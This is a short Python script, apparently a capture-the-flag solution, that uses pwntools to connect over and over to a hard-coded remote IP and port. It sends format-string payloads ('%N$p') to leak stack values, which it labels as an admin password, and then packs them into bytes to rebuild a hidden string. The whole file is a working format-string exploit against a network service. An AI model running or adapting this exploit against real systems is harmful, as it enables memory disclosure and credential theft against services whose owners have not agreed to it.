import pwn
import time

i = 1
l = []
while(i != 15):
	r = pwn.remote('185.235.41.205', 7050)
	p = "%" + str(i) + "$p"
	r.sendline(p)
	r.recvlines(21)
	adminPass = r.recvline().split(" ")[-1]
	print(adminPass)
	l.append(adminPass)
	i = i + 1
pl = []
for k in l:
	try:
		pl.append(pwn.p32(int(k, 16)))
	except Exception as e:
		pass
print("".join(pl))